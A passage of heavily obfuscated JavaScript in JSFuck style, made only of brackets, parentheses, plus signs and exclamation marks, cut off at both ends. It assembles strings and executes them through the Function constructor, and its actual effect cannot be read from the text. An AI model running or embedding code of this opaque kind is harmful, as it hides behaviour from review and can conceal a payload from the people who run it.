!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+(![])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+